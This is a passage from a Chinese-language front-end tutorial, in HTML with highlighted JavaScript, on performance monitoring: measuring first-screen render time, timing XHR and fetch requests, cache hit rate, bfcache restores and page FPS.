function_">now</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">observer.<span class="title function_">observe</span>(<span class="variable language_">document</span>, &#123;</span><br><span class="line">  <span class="attr">childList</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">subtree</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面的代码就是监听 DOM 变化的代码，同时需要过滤掉 style、script、link 等标签。<br><a name="qltvI"></a></p><h4 id="判断是否在首屏"><a href="#判断是否在首屏" class="headerlink" title="判断是否在首屏"></a>判断是否在首屏</h4><p>一个页面的内容可能非常多，但用户最多只能看见一屏幕的内容。所以在统计首屏渲染时间的时候，需要限定范围，把渲染内容限定在当前屏幕内。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> viewportWidth = <span class="variable language_">window</span>.<span class="property">innerWidth</span>;</span><br><span class="line"><span class="keyword">const</span> viewportHeight = <span class="variable language_">window</span>.<span class="property">innerHeight</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dom 对象是否在屏幕内</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isInScreen</span>(<span class="params">dom</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> rectInfo = dom.<span class="title function_">getBoundingClientRect</span>();</span><br><span class="line">  <span class="keyword">if</span> (rectInfo.<span class="property">left</span> &lt; viewportWidth &amp;&amp; rectInfo.<span class="property">top</span> &lt; viewportHeight) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="BhkqV"></a></p><h4 id="使用-requestAnimationFrame-获取-DOM-绘制时间"><a href="#使用-requestAnimationFrame-获取-DOM-绘制时间" class="headerlink" title="使用 requestAnimationFrame() 获取 DOM 绘制时间"></a>使用 requestAnimationFrame() 获取 DOM 绘制时间</h4><p>当 DOM 变更触发 MutationObserver 事件时，只是代表 DOM 内容可以被读取到，并不代表该 DOM 被绘制到了屏幕上。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1675217142882-a5994025-f4e1-4ff1-99d7-480026f8fd54.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1675217142882-a5994025-f4e1-4ff1-99d7-480026f8fd54.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"> 在浏览器绘制成功后再获取当前时间作为 DOM 绘制时间。<br><a name="tIcjw"></a></p><h4 id="和首屏内的所有图片加载时间作对比"><a href="#和首屏内的所有图片加载时间作对比" class="headerlink" title="和首屏内的所有图片加载时间作对比"></a>和首屏内的所有图片加载时间作对比</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getRenderTime</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> startTime = <span class="number">0</span>;</span><br><span class="line">  entries.<span class="title function_">forEach</span>(<span class="function">(<span class="params">entry</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (entry.<span class="property">startTime</span> &gt; startTime) &#123;</span><br><span class="line">      startTime = entry.<span class="property">startTime</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 需要和当前页面所有加载图片的时间做对比，取最大值</span></span><br><span class="line">  <span class="comment">// 图片请求时间要小于 startTime，响应结束时间要大于 startTime</span></span><br><span class="line">  performance.<span class="title function_">getEntriesByType</span>(<span class="string">&quot;resource&quot;</span>).<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      item.<span class="property">initiatorType</span> === <span class="string">&quot;img&quot;</span> &amp;&amp;</span><br><span class="line">      item.<span class="property">fetchStart</span> &lt; startTime &amp;&amp;</span><br><span class="line">      item.<span class="property">responseEnd</span> &gt; startTime</span><br><span class="line">    ) &#123;</span><br><span class="line">      startTime = item.<span class="property">responseEnd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> startTime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="j7Uxx"></a></p><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>现在的代码还没优化完，主要有两点注意事项：</p><ol><li>什么时候上报渲染时间？</li><li>如果兼容异步添加 DOM 的情况？</li></ol><p>第一点，必须要在 DOM 不再变化后再上报渲染时间，一般 load 事件触发后，DOM 就不再变化了。所以我们可以在这个时间点进行上报。<br />第二点，可以在 LCP 事件触发后再进行上报。不管是同步还是异步加载的 DOM，它都需要进行绘制，所以可以监听 LCP 事件，在该事件触发后才允许进行上报。<br />将以上两点方案结合在一起，就有了以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> isOnLoaded = <span class="literal">false</span>;</span><br><span class="line"><span class="title function_">executeAfterLoad</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  isOnLoaded = <span class="literal">true</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> timer;</span><br><span class="line"><span class="keyword">let</span> observer;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkDOMChange</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">clearTimeout</span>(timer);</span><br><span class="line">  timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 等 load、lcp 事件触发后并且 DOM 树不再变化时，计算首屏渲染时间</span></span><br><span class="line">    <span class="keyword">if</span> (isOnLoaded &amp;&amp; <span class="title function_">isLCPDone</span>()) &#123;</span><br><span class="line">      observer &amp;&amp; observer.<span class="title function_">disconnect</span>();</span><br><span class="line">      <span class="title function_">lazyReportCache</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;performance&quot;</span>,</span><br><span class="line">        <span class="attr">subType</span>: <span class="string">&quot;first-screen-paint&quot;</span>,</span><br><span class="line">        <span class="attr">startTime</span>: <span class="title function_">getRenderTime</span>(),</span><br><span class="line">        <span class="attr">pageURL</span>: <span class="title function_">getPageURL</span>(),</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      entries = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_">checkDOMChange</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, <span class="number">500</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checkDOMChange() 代码每次在触发 MutationObserver 事件时进行调用，需要用防抖函数进行处理。<br><a name="Jmuep"></a></p><h3 id="接口请求耗时"><a href="#接口请求耗时" class="headerlink" title="接口请求耗时"></a>接口请求耗时</h3><p>接口请求耗时需要对 XMLHttpRequest 和 fetch 进行监听。<br /><strong>监听 XMLHttpRequest</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">originalProto.<span class="property">open</span> = <span class="keyword">function</span> <span class="title function_">newOpen</span>(<span class="params">...args</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">url</span> = args[<span class="number">1</span>];</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">method</span> = args[<span class="number">0</span>];</span><br><span class="line">  originalOpen.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">originalProto.<span class="property">send</span> = <span class="keyword">function</span> <span class="title function_">newSend</span>(<span class="params">...args</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">startTime</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">onLoadend</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">endTime</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">duration</span> = <span class="variable language_">this</span>.<span class="property">endTime</span> - <span class="variable language_">this</span>.<span class="property">startTime</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123; status, duration, startTime, endTime, url, method &#125; = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="keyword">const</span> reportData = &#123;</span><br><span class="line">      status,</span><br><span class="line">      duration,</span><br><span class="line">      startTime,</span><br><span class="line">      endTime,</span><br><span class="line">      url,</span><br><span class="line">      <span class="attr">method</span>: (method || <span class="string">&quot;GET&quot;</span>).<span class="title function_">toUpperCase</span>(),</span><br><span class="line">      <span class="attr">success</span>: status &gt;= <span class="number">200</span> &amp;&amp; status &lt; <span class="number">300</span>,</span><br><span class="line">      <span class="attr">subType</span>: <span class="string">&quot;xhr&quot;</span>,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&quot;performance&quot;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">lazyReportCache</span>(reportData);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">removeEventListener</span>(<span class="string">&quot;loadend&quot;</span>, onLoadend, <span class="literal">true</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;loadend&quot;</span>, onLoadend, <span class="literal">true</span>);</span><br><span class="line">  originalSend.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如何判断 XML 请求是否成功？可以根据他的状态码是否在 200~299 之间。如果在，那就是成功，否则失败。<br /><strong>监听 fetch</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> originalFetch = <span class="variable language_">window</span>.<span class="property">fetch</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">overwriteFetch</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">fetch</span> = <span class="keyword">function</span> <span class="title function_">newFetch</span>(<span class="params">url, config</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> startTime = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="keyword">const</span> reportData = &#123;</span><br><span class="line">      startTime,</span><br><span class="line">      url,</span><br><span class="line">      <span class="attr">method</span>: (config?.<span class="property">method</span> || <span class="string">&quot;GET&quot;</span>).<span class="title function_">toUpperCase</span>(),</span><br><span class="line">      <span class="attr">subType</span>: <span class="string">&quot;fetch&quot;</span>,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&quot;performance&quot;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">originalFetch</span>(url, config)</span><br><span class="line">      .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        reportData.<span class="property">endTime</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">        reportData.<span class="property">duration</span> = reportData.<span class="property">endTime</span> - reportData.<span class="property">startTime</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> data = res.<span class="title function_">clone</span>();</span><br><span class="line">        reportData.<span class="property">status</span> = data.<span class="property">status</span>;</span><br><span class="line">        reportData.<span class="property">success</span> = data.<span class="property">ok</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_">lazyReportCache</span>(reportData);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">      &#125;)</span><br><span class="line">      .<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        reportData.<span class="property">endTime</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">        reportData.<span class="property">duration</span> = reportData.<span class="property">endTime</span> - reportData.<span class="property">startTime</span>;</span><br><span class="line">        reportData.<span class="property">status</span> = <span class="number">0</span>;</span><br><span class="line">        reportData.<span class="property">success</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_">lazyReportCache</span>(reportData);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> err;</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于 fetch，可以根据返回数据中的的 ok 字段判断请求是否成功，如果为 true 则请求成功，否则失败。<br /><strong>注意</strong>，监听到的接口请求时间和 chrome devtool 上检测到的时间可能不一样。这是因为 chrome devtool 上检测到的是 HTTP 请求发送和接口整个过程的时间。但是 xhr 和 fetch 是异步请求，接口请求成功后需要调用回调函数。事件触发时会把回调函数放到消息队列，然后浏览器再处理，这中间也有一个等待过程。<br><a name="xa2up"></a></p><h3 id="资源加载时间、缓存命中率"><a href="#资源加载时间、缓存命中率" class="headerlink" title="资源加载时间、缓存命中率"></a>资源加载时间、缓存命中率</h3><p>通过 PerformanceObserver 可以监听 resource 和 navigation 事件，如果浏览器不支持 PerformanceObserver，还可以通过 performance.getEntriesByType(entryType) 来进行降级处理。<br />当 resource 事件触发时，可以获取到对应的资源列表，每个资源对象包含以下一些字段：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1675217143086-bdfdb068-a7a4-4fdf-9fc7-a0bd65ab3d2d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1675217143086-bdfdb068-a7a4-4fdf-9fc7-a0bd65ab3d2d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />从这些字段中我们可以提取到一些有用的信息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">name</span>: entry.<span class="property">name</span>, <span class="comment">// 资源名称</span></span><br><span class="line">    <span class="attr">subType</span>: entryType,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;performance&#x27;</span>,</span><br><span class="line">    <span class="attr">sourceType</span>: entry.<span class="property">initiatorType</span>, <span class="comment">// 资源类型</span></span><br><span class="line">    <span class="attr">duration</span>: entry.<span class="property">duration</span>, <span class="comment">// 资源加载耗时</span></span><br><span class="line">    <span class="attr">dns</span>: entry.<span class="property">domainLookupEnd</span> - entry.<span class="property">domainLookupStart</span>, <span class="comment">// DNS 耗时</span></span><br><span class="line">    <span class="attr">tcp</span>: entry.<span class="property">connectEnd</span> - entry.<span class="property">connectStart</span>, <span class="comment">// 建立 tcp 连接耗时</span></span><br><span class="line">    <span class="attr">redirect</span>: entry.<span class="property">redirectEnd</span> - entry.<span class="property">redirectStart</span>, <span class="comment">// 重定向耗时</span></span><br><span class="line">    <span class="attr">ttfb</span>: entry.<span class="property">responseStart</span>, <span class="comment">// 首字节时间</span></span><br><span class="line">    <span class="attr">protocol</span>: entry.<span class="property">nextHopProtocol</span>, <span class="comment">// 请求协议</span></span><br><span class="line">    <span class="attr">responseBodySize</span>: entry.<span class="property">encodedBodySize</span>, <span class="comment">// 响应内容大小</span></span><br><span class="line">    <span class="attr">responseHeaderSize</span>: entry.<span class="property">transferSize</span> - entry.<span class="property">encodedBodySize</span>, <span class="comment">// 响应头部大小</span></span><br><span class="line">    <span class="attr">resourceSize</span>: entry.<span class="property">decodedBodySize</span>, <span class="comment">// 资源解压后的大小</span></span><br><span class="line">    <span class="attr">isCache</span>: <span class="title function_">isCache</span>(entry), <span class="comment">// 是否命中缓存</span></span><br><span class="line">    <span class="attr">startTime</span>: performance.<span class="title function_">now</span>(),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>判断该资源是否命中缓存</strong><br />在这些资源对象中有一个 transferSize 字段，它表示获取资源的大小，包括响应头字段和响应数据的大小。如果这个值为 0，说明是从缓存中直接读取的（强制缓存）。如果这个值不为 0，但是 encodedBodySize 字段为 0，说明它走的是协商缓存（encodedBodySize 表示请求响应数据 body 的大小）。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isCache</span>(<span class="params">entry</span>) &#123;</span><br><span class="line">  <span class="comment">// 直接从缓存读取或 304</span></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    entry.<span class="property">transferSize</span> === <span class="number">0</span> ||</span><br><span class="line">    (entry.<span class="property">transferSize</span> !== <span class="number">0</span> &amp;&amp; entry.<span class="property">encodedBodySize</span> === <span class="number">0</span>)</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不符合以上条件的，说明未命中缓存。然后将所有命中缓存的数据&#x2F;总数据就能得出缓存命中率。<br><a name="NuS1s"></a></p><h3 id="浏览器往返缓存-BFC（back-x2F-forward-cache）"><a href="#浏览器往返缓存-BFC（back-x2F-forward-cache）" class="headerlink" title="浏览器往返缓存 BFC（back&#x2F;forward cache）"></a>浏览器往返缓存 BFC（back&#x2F;forward cache）</h3><p>bfcache 是一种内存缓存，它会将整个页面保存在内存中。当用户返回时可以马上看到整个页面，而不用再次刷新。据该文章 <a href="https://link.juejin.cn/?target=https://web.dev/bfcache/">bfcache</a> 介绍，firfox 和 safari 一直支持 bfc，chrome 只有在高版本的移动端浏览器支持。但我试了一下，只有 safari 浏览器支持，可能我的 firfox 版本不对。<br />但是 bfc 也是有缺点的，当用户返回并从 bfc 中恢复页面时，原来页面的代码不会再次执行。为此，浏览器提供了一个 pageshow 事件，可以把需要再次执行的代码放在里面。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;pageshow&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="comment">// 如果该属性为 true，表示是从 bfc 中恢复的页面</span></span><br><span class="line">  <span class="keyword">if</span> (event.<span class="property">persisted</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;This page was restored from the bfcache.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;This page was loaded normally.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>从 bfc 中恢复的页面，我们也需要收集他们的 FP、FCP、LCP 等各种时间。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onBFCacheRestore</span>(<span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">requestAnimationFrame</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    [<span class="string">&quot;first-paint&quot;</span>, <span class="string">&quot;first-contentful-paint&quot;</span>].<span class="title function_">forEach</span>(<span class="function">(<span class="params">type</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">lazyReportCache</span>(&#123;</span><br><span class="line">        <span class="attr">startTime</span>: performance.<span class="title function_">now</span>() - event.<span class="property">timeStamp</span>,</span><br><span class="line">        <span class="attr">name</span>: type,</span><br><span class="line">        <span class="attr">subType</span>: type,</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;performance&quot;</span>,</span><br><span class="line">        <span class="attr">pageURL</span>: <span class="title function_">getPageURL</span>(),</span><br><span class="line">        <span class="attr">bfc</span>: <span class="literal">true</span>,</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面的代码很好理解，在 pageshow 事件触发后，用当前时间减去事件触发时间，这个时间差值就是性能指标的绘制时间。<strong>注意</strong>，从 bfc 中恢复的页面的这些性能指标，值一般都很小，一般在 10 ms 左右。所以要给它们加个标识字段 bfc: true。这样在做性能统计时可以对它们进行忽略。<br><a name="Pmo8q"></a></p><h3 id="FPS"><a href="#FPS" class="headerlink" title="FPS"></a>FPS</h3><p>利用 requestAnimationFrame() 我们可以计算当前页面的 FPS。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> next = <span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span></span><br><span class="line">  ? requestAnimationFrame</span><br><span class="line">  : <span class="function">(<span class="params">callback</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(callback, <span class="number">1000</span> / <span class="number">60</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> frames = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">fps</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> frame = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> lastSecond = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">calculateFPS</span>(<span class="params"></span>) &#123;</span><br><span class="line">    frame++;</span><br><span class="line">    <span class="keyword">const</span> now = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="keyword">if</span> (lastSecond + <span class="number">1000</span> &lt;= now) &#123;</span><br><span class="line">      <span class="comment">// 由于 now - lastSecond 的单位是毫秒，所以 frame 要 * 1000</span></span><br><span class="line">      <span class="keyword">const</span> fps = <span class="title class_">Math</span>.<span class="title function_">round</span>((frame * <span class="number">1000</span>) / (now - lastSecond));</span><br><span class="line">      frames.<span class="title function_">push</span>(fps);</span><br><span class="line"></span><br><span class="line">      frame = <span class="number">0</span>;</span><br><span class="line">      lastSecond = now;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 避免上报太快，缓存一定数量再上报</span></span><br><span class="line">    <span class="keyword">if</span> (frames.<span class="property">length</span> &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">      <span class="title function_">report</span>(</span><br><span class="line">        <span class="title function_">deepCopy</span>(&#123;</span><br><span class="line">          frames,</span><br><span class="line">          <span class="attr">type</span>: <span class="string">&quot;performace&quot;</span>,</span><br><span class="line">          <span class="attr">subType</span>: <span class="string">&quot;fps&quot;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      frames.<span class="property">length</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">next</span>(calculateFPS);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">calculateFPS</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码逻辑如下：</p><ol><li>先记录一个初始时间，然后每次触发 requestAnimationFrame() 时，就将帧数加 1。过去一秒后用帧数&#x2F;流逝的时间就能得到当前帧率。</li></ol><p>当连续三个低于 20 的 FPS 出现时，我们可以断定页面出现了卡顿，详情请看 <a href="https://link.juejin.cn/?target=https://zhuanlan.zhihu.com/p/39292837">如何监控网页的卡顿</a>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">isBlocking</span>(<span class="params">fpsList, below = <span class="number">20</span>, last = <span class="number">3</span></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span 